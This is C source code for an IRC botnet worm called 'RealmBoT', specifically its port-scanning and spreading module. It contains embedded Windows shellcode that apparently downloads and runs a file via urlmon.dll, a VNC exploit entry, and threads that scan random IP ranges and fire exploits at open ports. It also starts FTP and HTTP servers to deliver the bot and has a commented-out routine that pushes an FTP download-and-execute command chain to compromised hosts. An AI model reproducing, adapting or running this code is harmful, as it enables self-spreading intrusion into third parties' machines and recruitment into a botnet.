#include "headers/includes.h"
#include "headers/functions.h"
#include "headers/externs.h"



unsigned char szShellCode[] =
"\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03"
"\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74"
"\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E"
"\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03"
"\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C"
"\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40"
"\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C"
"\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC"
"\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F"
"\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB"
"\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83"
"\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF"
"\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF";



int iShellSize = sizeof( szShellCode );
//int iPageSize = sizeof( szPage );


ADVINFO advinfo[MAXTHREADS];
CRITICAL_SECTION CriticalSection;

EXPLOIT exploit[]={
//	{name,display name,port,function,stats, enable ftp},
   
#ifndef NO_VNC 
   {"vnc", "VNC", 5900, VNCExploit, 0, FALSE}, 
#endif


	{NULL, NULL, 0, NULL, 0, TRUE, TRUE}
};




void ListExploitStats(SOCKET sock, char *chan, BOOL notice)
{
	char buffer[IRCLINE], buffer2[IRCLINE];

	int extotal = 0;

	sprintf(buffer, "RealmBoT (portscan.plg) »»  Exploit Statistics:");
	for(int i=0; exploit[i].port != 0; i++) {
		extotal += exploit[i].stats;
		sprintf(buffer2," %s: %d,",exploit[i].name,exploit[i].stats);
		strncat(buffer, buffer2, sizeof(buffer));
	}
	sprintf(buffer2, " Total: %d in %s.", extotal, Uptime(started));
	strncat(buffer, buffer2, sizeof(buffer));

	irc_privmsg(sock, chan, buffer, notice);
	addlog(buffer);

	return;
}

void currentIP(SOCKET sock, char *chan, BOOL notice, int threadnum)
{
	char sendbuf[IRCLINE];

	if (findthreadid(SCAN_THREAD) > 0) {
		IN_ADDR in;
		in.s_addr = advinfo[threadnum].ip;

		sprintf(sendbuf, "RealmBoT (portscan.plg) »»  Current IP: %s.",finet_ntoa(in));
	} else
		sprintf(sendbuf ,"RealmBoT(portscan.plg) »»  Scan not active.");

	irc_privmsg(sock, chan, sendbuf, notice);
	addlog(sendbuf);

	return;
}

void CheckServers(ADVSCAN scan)
{
	char sendbuf[IRCLINE];

	DWORD id;

	if(scan.exploit != -1) {
			

				#ifndef NO_FTPD
				
				static FTP ftp;
			//	ftp.port = FTP_PORT; //puede deshabilitarse esta linea
				ftp.threads = 0;
				GetModuleFileName(0,ftp.filename,sizeof(ftp.filename));
				strncpy(ftp.requestname, filename, sizeof(ftp.requestname)-1);
				ftp.sock=scan.sock;
				ftp.notice = scan.notice;
				if (scan.msgchan[0] == '\0') {
					strncpy(ftp.chan, scan.chan, sizeof(ftp.chan)-1);
					ftp.silent = TRUE;
				} else {
					strncpy(ftp.chan, scan.msgchan, sizeof(ftp.chan)-1);
					ftp.silent = FALSE;
		
				} 
					sprintf(sendbuf, "RealmBoT (ftp.plg) »»  Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
				//
				#endif
			}
		 else if (exploit[scan.exploit].http) {
			if (findthreadid(HTTP_THREAD) == 0) {
				static HTTPD httpd;

				char *c;
				GetModuleFileName(0,httpd.dir,sizeof(httpd.dir));
				if ((c=strrchr(httpd.dir,'\\')) != NULL)
					*c='\0';
				httpd.port = httpport;
				httpd.enabled = FALSE;
				sprintf(httpd.chan, scan.chan);
				httpd.sock = scan.sock;
				httpd.notice = scan.notice;
				httpd.silent = scan.silent;

				sprintf(sendbuf,"RealmBoT (httpd.plg) »»  Server listening on IP: %s:%d, Directory: %s\\.", GetIP(scan.sock), httpd.port, httpd.dir);

				httpd.threadnum = addthread(sendbuf,HTTP_THREAD,NULL);
				if (threads[httpd.threadnum].tHandle = CreateThread(NULL, 0, &HTTP_Server_Thread, (LPVOID)&httpd, 0, &id)) {
					while(httpd.info == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf, "RealmBoT (httpd.plg) »»  Failed to start server, error: <%d>.", GetLastError());

				addlog(sendbuf);
			}
		}


	return;
}

unsigned long AdvGetNextIP(int threadnum)
{
	DWORD host;

	memcpy(&host, &advinfo[threadnum].ip, 4);
	host = fntohl(host);
	host += 1;
	host = fhtonl(host);
	memcpy(&advinfo[threadnum].ip, &host, 4);

	return (advinfo[threadnum].ip);
}

unsigned long AdvGetNextIPRandom(char *scanmask, int threadnum)
{
	int ip1=-1,ip2=-1,ip3=-1,ip4=-1;

	if (strlen(scanmask) > 15)
		return 0;

	sscanf(scanmask,"%d.%d.%d.%d",&ip1,&ip2,&ip3,&ip4);
	if (ip1==-1) ip1=rand();
	if (ip2==-1) ip2=rand();
	if (ip3==-1) ip3=rand();
	if (ip4==-1) ip4=rand();

	advinfo[threadnum].ip = (ip1+(ip2<<8)+(ip3<<16)+(ip4<<24));

	return (advinfo[threadnum].ip);
}

BOOL AdvPortOpen(unsigned long ip, unsigned int port, unsigned int delay)
{

	SOCKADDR_IN sin;
	unsigned long blockcmd=1;

	SOCKET sock = fsocket(AF_INET,SOCK_STREAM,0);
	if (sock == INVALID_SOCKET)
		return FALSE;

	sin.sin_family = AF_INET;
	sin.sin_addr.S_un.S_addr = ip;
	sin.sin_port = fhtons((unsigned short)port);
	fioctlsocket(sock,FIONBIO,&blockcmd);
	fconnect(sock,(LPSOCKADDR)&sin,sizeof(sin));

	TIMEVAL timeout;
	timeout.tv_sec=delay;
	timeout.tv_usec=0;
	FD_SET rset;
	FD_ZERO(&rset);
	FD_SET(sock,&rset);

	int i = fselect(0,0,&rset,0,&timeout);
	fclosesocket(sock);

	if (i<=0)
		return FALSE;
	else
		return TRUE;
}

BOOL SynPortOpen(unsigned long src_ip, unsigned long dest_ip, unsigned int port, unsigned int delay)
{
	char buffer[LOGLINE];
	int size;

	unsigned short src_port = 9801;

	TCPHEADER2 send_tcp;
	send_tcp.source = fhtons(src_port);
	send_tcp.dest = fhtons((unsigned short)port);
	send_tcp.seq = rand();
	send_tcp.ack_seq = 0;
	send_tcp.res1 = 0;
	send_tcp.res2 = 0;
	send_tcp.doff = 5;
	send_tcp.fin = 0;
	send_tcp.syn = 1;  /*This is the important part..;) */
	send_tcp.rst = 0;
	send_tcp.psh = 0;
	send_tcp.ack = 0;
	send_tcp.urg = 0;
	send_tcp.window = fhtons(512);
	send_tcp.check = 0;
	send_tcp.urg_ptr = 0;

	PSDHEADER psdheader;
	psdheader.saddr = src_ip;
	psdheader.daddr = dest_ip;
	psdheader.zero = 0;
	psdheader.proto = IPPROTO_TCP;
	psdheader.length = fhtons(sizeof(send_tcp));

	memcpy (&psdheader.tcp, &send_tcp, sizeof (send_tcp));
	send_tcp.check = checksum((unsigned short *)&psdheader, sizeof (psdheader));

	SOCKADDR_IN ssin;
	memset(&ssin,0,sizeof(ssin));
	ssin.sin_family = AF_INET;
	ssin.sin_port = fhtons((unsigned short)port);
	ssin.sin_addr.s_addr = dest_ip;
	int ssin_len = sizeof(ssin);

	SOCKET tcp_sock = fsocket(AF_INET, SOCK_RAW, IPPROTO_TCP);
	if (tcp_sock == INVALID_SOCKET) {
		addlog("socket open failed");
		return FALSE;
	}

	// 10022: WSAEINVAL - An invalid argument was supplied.
	if ((size = fsendto(tcp_sock,(const char *)&send_tcp,sizeof(send_tcp),0,(LPSOCKADDR)&ssin,ssin_len)) != 20) {
		sprintf(buffer,"sendto() socket failed. sent = %d <%d>.", size, fWSAGetLastError());
		addlog(buffer);
		fclosesocket(tcp_sock);
		return FALSE;
	}

	RECVHEADER recv_tcp;
	memset (&recv_tcp,'\0',sizeof(recv_tcp));
	while (recv_tcp.tcp.dest != src_port) {
		if (frecvfrom(tcp_sock,(char *)&recv_tcp,sizeof(recv_tcp),0,(LPSOCKADDR)&ssin, &ssin_len) < 0) {
			addlog("recvfrom() socket failed");
			fclosesocket(tcp_sock);
			return FALSE;
		}
	}

	fclosesocket(tcp_sock);
	if (recv_tcp.tcp.syn == 1) {
		addlog("Socket open.");

		return TRUE;
	} else {
		addlog("Socket closed.");
		return FALSE;
	}
}

/*BOOL ConnectShell(EXINFO exinfo, unsigned int connectport)
{
	int len;
	char recvbuf[1024];
	SOCKET sockfd;
	SOCKADDR_IN shell_addr;
	ZeroMemory(&shell_addr, sizeof(shell_addr));

	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = finet_addr(exinfo.ip);
	shell_addr.sin_port = fhtons(connectport);

	if ((sockfd = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
		return FALSE;
	if (fconnect(sockfd,(LPSOCKADDR)&shell_addr, sizeof(shell_addr)) == SOCKET_ERROR) 
		return FALSE;

	char mkdir_buff[400];

	len = frecv(sockfd, recvbuf, 1024, 0);

	char fname[_MAX_FNAME];
	sprintf(fname,"eraseme_%d%d%d%d%d.exe",rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);
	_snprintf(mkdir_buff,sizeof(mkdir_buff),
		"echo open %s %d > i&echo user 1 1 >> i &echo get %s >> i &echo quit >> i &ftp -n -s:i &%s\r\n",
		(PrivateIP(exinfo.ip)?inip:exip),FTP_PORT,fname,fname);

	if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	Sleep(500);
	_snprintf(mkdir_buff, sizeof (mkdir_buff), "%s\r\n", filename);

	if (fsend(sockfd, mkdir_buff, strlen(mkdir_buff),0) == -1)
		return FALSE;

	len = frecv(sockfd, recvbuf, 1024, 0);
	fclosesocket(sockfd);
	return TRUE;
}*/

DWORD WINAPI AdvPortScanner(LPVOID param)
{
	IN_ADDR in;
	char logbuf[LOGLINE];

	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->cgotinfo = TRUE;

	int threadnum=scan.cthreadnum;
	int threadid=scan.cthreadid;

	srand(GetTickCount());
	while (advinfo[threads[threadnum].parent].info) {
		DWORD dwIP;

		if (scan.random)
			dwIP = AdvGetNextIPRandom(scan.ip,threads[threadnum].parent);
		else
			dwIP = AdvGetNextIP(threads[threadnum].parent);
		in.s_addr = dwIP;

		sprintf(logbuf,"RealmBoT (portscan.plg) »»  IP: %s:%d, Scan thread: %d, Sub-thread: %d.",
			finet_ntoa(in), scan.port, threads[threadnum].parent, threadid);
		sprintf(threads[threadnum].name, logbuf);

		if (AdvPortOpen(dwIP, scan.port, scan.delay) == TRUE) {
		//if (SynPortOpen(finet_addr(GetIP(scan.sock)), dwIP, scan.port, scan.delay) == TRUE) {
			if (scan.exploit == -1) {
				EnterCriticalSection(&CriticalSection);

				sprintf(logbuf,"RealmBoT (portscan.plg) »»  IP: %s, Port %d is open.",finet_ntoa(in),scan.port);
				if (!scan.silent) {
					if (scan.msgchan[0] != '\0')
						irc_privmsg(scan.sock,scan.msgchan,logbuf,scan.notice, TRUE);
					else
						irc_privmsg(scan.sock,scan.chan,logbuf,scan.notice, TRUE);
				}
				addlog(logbuf);

				LeaveCriticalSection(&CriticalSection);
			} else {
				EXINFO exinfo;

				sprintf(exinfo.ip, finet_ntoa(in));
				sprintf(exinfo.command, exploit[scan.exploit].command);
				if (scan.msgchan[0] != '\0')
					sprintf(exinfo.chan, scan.msgchan);
				else
					sprintf(exinfo.chan, scan.chan);
				exinfo.sock = scan.sock;
				exinfo.notice = scan.notice;
				exinfo.silent = scan.silent;
				exinfo.port = scan.port;
				exinfo.threadnum = threadnum;
				exinfo.exploit = scan.exploit;
				exploit[scan.exploit].exfunc(exinfo);


			}
		}
		Sleep(2000);
	}
	clearthread(threadnum);

	ExitThread(0);
}

DWORD WINAPI AdvScanner(LPVOID param)
{
	char buffer[LOGLINE];


	ADVSCAN scan = *((ADVSCAN *)param);
	ADVSCAN *scanp = (ADVSCAN *)param;
	scanp->gotinfo = TRUE;
	advinfo[scan.threadnum].ip = finet_addr(scan.ip);

	CheckServers(scan);

	if (findthreadid(SCAN_THREAD) == 1) {
		DeleteCriticalSection(&CriticalSection); // just in case

		if (!InitializeCriticalSectionAndSpinCount(&CriticalSection, 0x80000400)) {
			// failed to initialize CriticalSection
			sprintf(buffer,"RealmBoT (portscan.plg) »»  Failed to initialize critical section.");
			if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
			addlog(buffer);

			return 0;
		}
	}

	advinfo[scan.threadnum].info = TRUE;
	for (unsigned int i=1;i<=(scan.threads);i++) {
		scan.cthreadid = i;
		sprintf(buffer,"RealmBoT (portscan.plg) »»  %s:%d, Scan thread: %d, Sub-thread: %d.",scan.ip, scan.port,scan.threadnum,scan.cthreadid);
		scan.cthreadnum = addthread(buffer,SCAN_THREAD,NULL);
		threads[scan.cthreadnum].parent = scan.threadnum;
		if (threads[scan.cthreadnum].tHandle = CreateThread(0,0,&AdvPortScanner,(LPVOID)&scan,0,0)) {
			while (scan.cgotinfo == FALSE)
				Sleep(30);
		} else {
			sprintf(buffer, "RealmBoT (portscan.plg) »»  Failed to start worker thread, error: <%d>.", GetLastError());
			addlog(buffer);
		}

		Sleep(30);
	}

	if (scan.minutes != 0)
		Sleep(60000*scan.minutes);
	else
		while (advinfo[scan.threadnum].info == TRUE) Sleep(2000);

	IN_ADDR in;
	in.s_addr = advinfo[scan.threadnum].ip;
	sprintf(buffer,"RealmBoT (portscan.plg) »»  Finished at %s:%d after %d minute(s) of scanning.", finet_ntoa(in), scan.port, scan.minutes);
	if (!scan.silent) irc_privmsg(scan.sock,scan.chan,buffer,scan.notice);
	addlog(buffer);

	advinfo[scan.threadnum].info = FALSE;
	Sleep(3000);

	if (findthreadid(SCAN_THREAD) == 1)
		DeleteCriticalSection(&CriticalSection);

	clearthread(scan.threadnum);

	ExitThread(0);
}

